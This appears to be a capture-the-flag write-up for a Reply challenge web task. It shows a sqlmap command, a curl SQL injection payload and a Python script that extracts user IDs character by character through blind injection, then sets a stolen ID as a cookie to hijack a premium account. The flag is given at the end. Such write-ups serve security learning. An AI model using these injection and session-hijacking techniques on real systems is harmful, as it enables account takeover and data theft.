#### Challenge:

The palace of the Web Realm, a gleaming place called Hypercloud, is guarded by Polyglot, an amorphous being that travels through the ether at extraordinary speeds. Polyglot is an arcane guardian, with the ability to speak and understand all existing languages.

[[Enter the Tavern](http://gamebox1.reply.it/web2-3c91477fb7fb643fc15d090da43cb634f20f0ed7/)](http://gamebox1.reply.it/web2-3c91477fb7fb643fc15d090da43cb634f20f0ed7/)

---

#### Solution:

- poking around the application revealed that one page have hidden form field
```html
<form hidden="true">
    <input name="year">
</form>
```
- using it with `sqlmap -u "http://gamebox1.reply.it/web2-3c91477fb7fb643fc15d090da43cb634f20f0ed7/hof" --data "year=*" --random-agent --level 5 --risk 3 --dbs` reveals that there is SQL injection
- after long time digging and trying out different stuff we found that there is in the same table also `uid` column that could be leaked/guessed for the `top` players with `curl -vX POST  'http://gamebox1.reply.it/web2-3c91477fb7fb643fc15d090da43cb634f20f0ed7/hof' --data "year=' or (1=1 and year=2023 and name='humming_non-smoker2003' and uid like '2%')--"`

```python
import requests
import string

candidates = "abcdef" + string.digits + '-'

ses = requests.session()

r = ses.post(
    "http://gamebox1.reply.it/web2-3c91477fb7fb643fc15d090da43cb634f20f0ed7/hof",
    data={"year": "' or 1=1 --"}
)

names = []

for line in r.text.splitlines():
    if '<td class="prize">' in line:
        names.append(
            line.split(">")[1].split("<")[0]
        )

uuid = ""

for name in names:
    while len(uuid) < 36:
        for c in candidates:
            r = ses.post(
                f'http://gamebox1.reply.it/web2-3c91477fb7fb643fc15d090da43cb634f20f0ed7/hof',
                data={"year": "' or (1=1 and name='" + name + "' and uid like '" + uuid + c + "%')--"})

            listings = []
            for line in r.text.splitlines():
                if '<td class="prize">' in line:
                    listings.append(
                        line.split(">")[1].split("<")[0]
                    )

            if len(listings) == 1 and name in r.text:
                uuid = uuid + c
                break

    ses.cookies.set("UID", uuid, domain="gamebox1.reply.it")
    r = ses.post(
        "http://gamebox1.reply.it/web2-3c91477fb7fb643fc15d090da43cb634f20f0ed7/bets_history")

    if "You need a premium account to use the feature" not in r.text:
        print(name, uuid, "Premium")
        break
    else:
        print(name, uuid)
    uuid = ""
```

- now that we have `uid` of premium account we can just follow it's bid based on `bets_history` and earn the `prize`

---

<details><summary>FLAG:</summary>

```
{FLG: I_4m_n0t_impressed_by_y0ur_perf0rm4nce}
```

</details>
